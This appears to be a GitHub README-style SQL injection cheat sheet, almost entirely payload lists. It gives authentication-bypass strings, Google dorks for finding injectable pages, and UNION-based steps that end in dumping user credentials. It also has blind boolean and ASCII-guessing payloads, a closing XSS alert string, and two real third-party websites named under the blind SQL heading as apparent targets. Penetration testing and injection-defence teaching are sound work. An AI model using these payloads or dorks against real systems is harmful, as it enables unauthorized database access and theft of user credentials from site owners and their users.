# SQL-CHEAT-SHEET-
Use our SQL Injection Cheat Sheet to learn about the different variants of the SQL Injection vulnerability. In this cheat sheet you can find detailed technical information about SQL Injection vulnerabilities against MySQL, Microsoft SQL Server, Oracle and PostgreSQL SQL servers.

# About the SQL Injection Cheat Sheet

This SQL injection cheat sheet was originally published in 2007 by Ferruh Mavituna on his blog. We have updated it and moved it over from our CEO's blog. Currently this SQL Cheat Sheet only contains information for MySQL, Microsoft SQL Server, and some limited information for ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every situation because real live environments may vary depending on the usage of parenthesis, different code bases and unexpected, strange and complex SQL sentences. 

*********************************************************************************************************************************************************************************
------------------------------------------------ AUTHENTICATION BYPASS ATTACK ------------------------------------------------

1’ or ‘1’ = ‘1
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin' or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*

inurl:admin_login.php
inurl:admin/login.php
inurl:admin-login.php
inurl:adminlogin.php
*********************************************************************************************************************************************************************************
######################## Some Google dorks for sql injection #####################
inurl:sql.php?id=
inurl:news_view.php?id=
inurl:select_biblio.php?id=
inurl:humor.php?id=
inurl:aboutbook.php?id=
inurl:fiche_spectacle.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
inurl:readnews.php?id=

inurl: php?id=
inurl: asp?id=
inurl: net?id=
*********************************************************************************************************************************************************************************
______________________________ ERROR & UNION SQL INJECTION _______________________

eg: http://vulnsite.com/news.php?id=1          :---  id=1' or id=2-1
to provoke errors
?id=0X01
?id=9999999999999999999999999999999999999999999999
?id=2"
?id=3") and '1'='1'
union select 1,2,3,4,5--+
php?id=-23 union select 1,2,3,4,5--+
.php?id=23 and false union select 1,2,3,4,5--+

testphp.vulnweb.com/artists.php?artist=-1 order by 4--
testphp.vulnweb.com/artists.php?artist=-1 order by 3--
testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3--
testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3--
testphp.vulnweb.com/artists.php?artist=-1 union select 1,version(),3--
testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- 
union select 1,group_concat(uname,0x3a,pass,email),3 from users--

*********************************************************************************************************************************************************************************
################# FOR BLIND SQL #######################

https://www.thaibusinessnews.com/readnews.php?id=2114

https://www.hotelone.com.pk/article.php?id=15

Two types of blind sql are there:- Normal Blind, Totally Blind

How to check? 
Conditions:- True or False

No Changes on the default page is "True" else "False"

Check for subselect or subquery (used for comparing)

id=1 and (select 1)=1 to check whether we can execute subquerry or not

and (select 1 from login limit 0,1)=1 ///Guessing method to find the table name
 
and (select substring(concat(1,password),1,1) from login limit 0,1)=1 //Guessing column name

and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80 //checks the first character with the ascii value provided, if its true then we need to increase the value, if its false then we got the character.
*********************************************************************************************************************************************************************************
MACHINE_IP/sqli-labs/Less-8/?id=1' OR 1 < 2 --+ = True

MACHINE_IP/sqli-labs/Less-8/?id=1' OR 1 > 2 --+ = False

.

In sql language, there's a really useful function called SUBSTR() which extracts a substring from a string (starting at any position). 
It takes 3 input values:
1. Operated text (in our case database name)
2. Character to start with
3. Number of characters to extract


AND (substr((select database()),1,1)) - this will return us the first character of the database name. 


1' substr((select database()),1,1)) = s --+


MACHINE_IP/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
 

Now try guessing the second letter using the comparison technique.

MACHINE_IP/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),2,1))) < 115 --+


<script>alert("Happy-Hacking")</script>
